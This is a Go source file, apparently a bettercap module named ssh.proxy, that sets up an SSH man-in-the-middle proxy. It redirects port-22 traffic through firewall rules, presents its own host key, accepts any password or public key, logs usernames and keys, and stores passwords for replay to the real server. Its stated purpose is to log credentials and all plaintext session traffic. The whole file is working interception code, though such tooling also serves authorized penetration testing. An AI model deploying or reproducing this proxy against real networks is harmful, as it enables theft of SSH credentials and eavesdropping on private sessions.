package ssh_proxy

import (
	"fmt"
	"net"
	"sync"

	"github.com/bettercap/bettercap/v2/firewall"
	"github.com/bettercap/bettercap/v2/session"

	"golang.org/x/crypto/ssh"
)

type SSHProxy struct {
	session.SessionModule
	Redirection *firewall.Redirection
	listener    net.Listener
	serverConf  *ssh.ServerConfig
	hostKey     ssh.Signer
	waitGroup   *sync.WaitGroup
	sshPort     int
	address     string
	script      *SSHProxyScript
}

func NewSSHProxy(s *session.Session) *SSHProxy {
	mod := &SSHProxy{
		SessionModule: session.NewSessionModule("ssh.proxy", s),
		waitGroup:     &sync.WaitGroup{},
	}

	mod.AddParam(session.NewIntParameter("ssh.port",
		"22",
		"Remote SSH port to intercept."))

	mod.AddParam(session.NewStringParameter("ssh.address",
		"",
		"",
		"Remote address to forward SSH connections to. If empty, the original destination is resolved from the NAT table (Linux only)."))

	mod.AddParam(session.NewStringParameter("ssh.proxy.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"Address to bind the SSH proxy to."))

	mod.AddParam(session.NewIntParameter("ssh.proxy.port",
		"2222",
		"Port to bind the SSH proxy to."))

	mod.AddParam(session.NewStringParameter("ssh.proxy.hostkey",
		"",
		"",
		"Path to a PEM-encoded private key for the proxy host key (auto-generated if empty)."))

	mod.AddParam(session.NewStringParameter("ssh.proxy.script",
		"",
		"",
		"Path of a SSH proxy JS script."))

	mod.AddHandler(session.NewModuleHandler("ssh.proxy on", "",
		"Start SSH MITM proxy.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("ssh.proxy off", "",
		"Stop SSH MITM proxy.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod *SSHProxy) Name() string {
	return "ssh.proxy"
}

func (mod *SSHProxy) Description() string {
	return "A SSH MITM proxy that intercepts SSH connections, logs authentication credentials and all plaintext session traffic, and forwards transparently to the real destination."
}

func (mod *SSHProxy) Author() string {
	return "sshproxy"
}

func (mod *SSHProxy) Configure() error {
	var err error
	var proxyPort int
	var proxyAddress string
	var hostKeyPath string
	var scriptPath string

	if mod.Running() {
		return session.ErrAlreadyStarted(mod.Name())
	}

	if err, mod.sshPort = mod.IntParam("ssh.port"); err != nil {
		return err
	}
	if err, mod.address = mod.StringParam("ssh.address"); err != nil {
		return err
	}
	if err, proxyAddress = mod.StringParam("ssh.proxy.address"); err != nil {
		return err
	}
	if err, proxyPort = mod.IntParam("ssh.proxy.port"); err != nil {
		return err
	}
	if err, hostKeyPath = mod.StringParam("ssh.proxy.hostkey"); err != nil {
		return err
	}
	if err, scriptPath = mod.StringParam("ssh.proxy.script"); err != nil {
		return err
	}

	// Load JS script if provided
	if scriptPath != "" {
		if err, mod.script = LoadSSHProxyScript(scriptPath, mod.Session); err != nil {
			return err
		}
		mod.Debug("script %s loaded.", scriptPath)
	}

	// Generate or load host key
	if hostKeyPath != "" {
		if mod.hostKey, err = loadHostKey(hostKeyPath); err != nil {
			return fmt.Errorf("error loading host key from %s: %v", hostKeyPath, err)
		}
		mod.Info("loaded host key from %s", hostKeyPath)
	} else {
		if mod.hostKey, err = generateHostKey(); err != nil {
			return fmt.Errorf("error generating host key: %v", err)
		}
		mod.Info("generated ephemeral ECDSA host key (fingerprint: %s)",
			ssh.FingerprintSHA256(mod.hostKey.PublicKey()))
	}

	// Build the SSH server config. We use a PasswordCallback and
	// PublicKeyCallback that always accept — the real authentication
	// happens when we dial upstream. The credentials are stashed on
	// the ConnMetadata via Permissions.Extensions so the connection
	// handler can replay them.
	mod.serverConf = &ssh.ServerConfig{
		// Accept password auth — stash the password for upstream replay
		PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
			mod.Info("[%s] password auth: user=%s", conn.RemoteAddr(), conn.User())
			return &ssh.Permissions{
				Extensions: map[string]string{
					"password": string(password),
				},
			}, nil
		},
		// Accept pubkey auth — we can't replay the private key upstream,
		// so this is logged but the upstream dial will need agent forwarding
		// or a fallback to none/keyboard-interactive.
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			mod.Info("[%s] pubkey auth: user=%s type=%s fingerprint=%s",
				conn.RemoteAddr(), conn.User(), key.Type(),
				ssh.FingerprintSHA256(key))
			return &ssh.Permissions{
				Extensions: map[string]string{
					"pubkey": string(ssh.MarshalAuthorizedKey(key)),
				},
			}, nil
		},
	}
	mod.serverConf.AddHostKey(mod.hostKey)

	// Start TCP listener
	listenAddr := fmt.Sprintf("%s:%d", proxyAddress, proxyPort)
	if mod.listener, err = net.Listen("tcp", listenAddr); err != nil {
		return fmt.Errorf("error binding to %s: %v", listenAddr, err)
	}

	// Set up IP forwarding + firewall redirection
	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding.")
		mod.Session.Firewall.EnableForwarding(true)
	}

	mod.Redirection = firewall.NewRedirection(mod.Session.Interface.Name(),
		"TCP",
		mod.sshPort,
		proxyAddress,
		proxyPort)

	if mod.address != "" {
		mod.Redirection.SrcAddress = mod.address
	} else {
		// When intercepting all SSH traffic, exclude the proxy machine's own IP
		// to prevent redirecting management SSH connections to ourselves (loop).
		mod.Redirection.ExcludeAddress = proxyAddress
	}

	if err := mod.Session.Firewall.EnableRedirection(mod.Redirection, true); err != nil {
		return err
	}

	mod.Debug("applied redirection %s", mod.Redirection.String())

	return nil
}

func (mod *SSHProxy) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {
		if mod.address != "" {
			mod.Info("started on %s, forwarding to %s:%d",
				mod.listener.Addr().String(), mod.address, mod.sshPort)
		} else {
			mod.Info("started on %s, intercepting port %d (auto-detect destination via NAT)",
				mod.listener.Addr().String(), mod.sshPort)
		}

		for mod.Running() {
			conn, err := mod.listener.Accept()
			if err != nil {
				if mod.Running() {
					mod.Warning("error accepting connection: %s", err)
				}
				continue
			}

			mod.waitGroup.Add(1)
			go func() {
				defer mod.waitGroup.Done()
				mod.handleConnection(conn)
			}()
		}
	})
}

func (mod *SSHProxy) Stop() error {
	if mod.Redirection != nil {
		mod.Debug("disabling redirection %s", mod.Redirection.String())
		if err := mod.Session.Firewall.EnableRedirection(mod.Redirection, false); err != nil {
			return err
		}
		mod.Redirection = nil
	}

	return mod.SetRunning(false, func() {
		if mod.listener != nil {
			mod.listener.Close()
		}
		mod.Info("waiting for active SSH sessions to close ...")
		mod.waitGroup.Wait()
	})
}
